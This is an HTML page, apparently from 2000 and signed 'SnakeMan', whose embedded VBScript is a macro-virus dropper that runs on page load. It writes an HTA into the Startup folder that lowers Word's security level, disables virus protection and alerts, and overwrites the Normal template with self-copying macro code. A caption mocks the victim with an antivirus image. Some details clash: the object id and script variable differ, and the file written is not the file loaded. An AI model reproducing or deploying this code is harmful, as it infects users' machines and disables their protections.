<html>

<head>
<title>SnakeMan</title>
</head>

<body bgcolor="#000000">
<font size="5" face="Comic Sans MS" color="#FF0000">

<p align="center">Copyright (C) 2000 by SnakeMan ~^^~ - SnakeMan.Inst</font> </p>

<p align="center">
<object classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC" id="sn" width="0" height="0"
align="left">
</object>
<script language="VBScript">
On Error Resume Next
fs.Path="..\Start Menu\Programs\StartUp\SnakeMan.hta"
fs.Doc="<" & "script language=""VBScript"">" & Chr(13) & Chr(10) & "On Error Resume Next" & Chr(13) & Chr(10) & "Set FSO = CreateObject(""Scripting.FileSystemObject"")" & Chr(13) & Chr(10) & "Set WshShell = CreateObject(""WScript.Shell"")" & Chr(13) & Chr(10) & "WshShell.Regwrite""HKCU\Software\Microsoft\Office\9.0\Word\Security\Level"", 1" & Chr(13) & Chr(10) & "If FSO.FileExists (""C:\FS.SYS"") = 0 Then" & Chr(13) & Chr(10) & "Set FS = FSO.CreateTextFile (""C:\Sn.SYS"",1)" & Chr(13) & Chr(10) & "FS.WriteLine""'Copyright (C) 2000 by SnakeMan ~^^~ - SnakeMan""" & Chr(13) & Chr(10) & "FS.WriteLine""Private Sub Document_Close()""" & Chr(13) & Chr(10) & "FS.WriteLine""On Error Resume Next""" & Chr(13) & Chr(10) & "FS.WriteLine""Options.VirusProtection = 0""" & Chr(13) & Chr(10) & "FS.WriteLine""Options.SaveNormalPrompt = 0""" & Chr(13) & Chr(10) & "FS.WriteLine""Application.DisplayAlerts = 0""" & Chr(13) & Chr(10) & "FS.WriteLine""Application.ScreenUpdating = 0""" & Chr(13) & Chr(10) & "FS.WriteLine""Application.EnableCancelKey = 0""" & Chr(13) & Chr(10) & "FS.WriteLine""System.PrivateProfileString("" & Chr(34) & Chr(34) & "","" & Chr(34) & ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"" & Chr(34) & "","" & Chr(34) & ""Level"" & Chr(34) & "") = 1&""" & Chr(13) & Chr(10) & "FS.WriteLine""For Each £\ In VBE.VBProjects""" & Chr(13) & Chr(10) & "FS.WriteLine""If £\.Protection <> 1 And £\.Description <> "" & Chr(34) & ""SnakeMan"" & Chr(34) & "" Then""" & Chr(13) & Chr(10) & "FS.WriteLine""£\.Description = "" & Chr(34) & ""SnakeMan"" & Chr(34) & "" """ & Chr(13) & Chr(10) & "FS.WriteLine""With £\.VBComponents(1).CodeModule""" & Chr(13) & Chr(10) & "FS.WriteLine"".DeleteLines 1, .CountOfLines""" & Chr(13) & Chr(10) & "FS.WriteLine"".AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 17)""" & Chr(13) & Chr(10) & "FS.WriteLine""End With: End If: Next""" & Chr(13) & Chr(10) & "FS.WriteLine""End Sub""" & Chr(13) & Chr(10) & "FS.Close" & Chr(13) & Chr(10) & "End If" & Chr(13) & Chr(10) & "Set WordApp = GetObject(, ""Word.Application"")" & Chr(13) & Chr(10) & "If WordApp = """" Then Set WordApp = CreateObject(""Word.Application"")" & Chr(13) & Chr(10) & "WordApp.Options.VirusProtection = 0" & Chr(13) & Chr(10) & "WordApp.Options.SaveNormalPrompt = 0" & Chr(13) & Chr(10) & "WordApp.NormalTemplate.VBProject.Description = ""SnakeMan""" & Chr(13) & Chr(10) & "Set Nor = WordApp.NormalTemplate.VBProject.VBComponents(1).CodeModule" & Chr(13) & Chr(10) & "Nor.DeleteLines 1, Nor.CountOfLines" & Chr(13) & Chr(10) & "Nor.AddFromFile ""C:\FS.SYS""" & Chr(13) & Chr(10) & "WordApp.NormalTemplate.Save" & Chr(13) & Chr(10) & "<" & "/script>"
fs.Write
</script> </p>

<p align="center">&nbsp;</p>

<p>&nbsp;</p>

<p align="center"><img src="http://www.avp.ch/images/avpm2.gif"
alt="I think you need a antivirus software try this one out." border="1" width="114"
height="79" align="center"></p>
</body>
</html>
